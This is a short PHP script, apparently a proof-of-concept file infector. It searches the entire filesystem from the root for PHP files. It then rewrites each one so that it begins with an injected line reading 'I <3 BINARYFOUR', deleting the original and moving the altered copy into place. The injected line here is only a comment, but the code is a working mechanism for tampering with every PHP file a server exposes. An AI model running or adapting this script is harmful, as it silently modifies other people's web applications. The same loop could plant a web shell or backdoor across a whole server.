<?php

// bash command for finding all php scripts: sudo find / -type f -name "*.php*"

// get a list of all PHP files on this server that this script can edit --start

$directory = new RecursiveDirectoryIterator('/');
$iterator = new RecursiveIteratorIterator(
    $directory,
    RecursiveIteratorIterator::LEAVES_ONLY,
    RecursiveIteratorIterator::CATCH_GET_CHILD
);
$regex = new RegexIterator(
    $iterator,
    '/.+(?<!sqspell)(\.php)$/i',
    RecursiveRegexIterator::GET_MATCH
);
$filenames = array();


foreach($regex as $r) {
    foreach($r as $file) {
        if($file != '.php') {
            array_push($filenames, $file);
        }
    }
}

// --end

// Check each file
foreach($filenames as $filename) {

    // Open file (read only)
    $script = fopen($filename, "r");

    // Let's write to a new file, as opposed to reading the whole file
    // script in memory, to avoid issues with large files
    $infected = fopen("$filename.infected", "w");

    $infection = "<?php // I <3 BINARYFOUR ?>\n";

    // infection first
    fwrite($infected, $infection, strlen($infection));

    // past the rest of the original file
    while($contents = fgets($script)) {
        fwrite($infected, $contents, strlen($contents));
    }

    // Close both handles and move the infected file in to place
    fclose($script);
    fclose($infected);
    unlink("$filename");
    rename("$filename.infected", $filename);
}

